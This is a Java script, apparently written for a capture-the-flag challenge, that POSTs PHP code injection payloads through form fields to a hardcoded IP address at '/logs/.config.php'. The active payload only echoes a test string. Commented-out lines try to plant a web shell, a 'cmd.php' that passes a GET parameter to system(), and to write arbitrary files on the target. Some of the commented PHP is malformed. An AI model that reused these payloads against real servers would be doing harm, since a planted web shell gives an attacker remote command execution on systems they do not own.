package cn.xiaoyes.ctf;

import cn.hutool.Hutool;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import cn.hutool.http.HttpUtil;

public class Script2 {
    public static void main(String[] args) {
        HttpRequest post = HttpUtil.createPost("http://4.2.55.101/logs/.config.php");
        post.header("User-Agent","flag");
        /* file_put_contents('/cmd.php','<?phpsystem($_GET['cmd'] ?>)') */
        /* touch('./cmd.php'); file_put_contents('./cmd.php','<?php system($_GET['cmd'] ?>)')  */
//        post.form("1","touch('cmd.php');$read=fopen('cmd.php','W');fwrite($read,'Content')");
        /*post.form("0","file_put_contents('logfile.php','123')");
        post.form("1","file_put_contents('logfile.php','123')");
        post.form("2","file_put_contents('logfile.php','123')");*/
        /*post.form("0","$read=fopen('logfile.php','W');fwrite($read,'Content')");
        post.form("1","$read=fopen('logfile.php','W');fwrite($read,'Content')");
        post.form("2","$read=fopen('logfile.php','W');fwrite($read,'Content')");*/
        /* logfile.php */
        post.form("1","echo('X')");
        HttpResponse execute = post.execute();
        System.out.println(execute.body());
        /* file_put_contents('/tmp/tmp.txt', $source); */

    }
}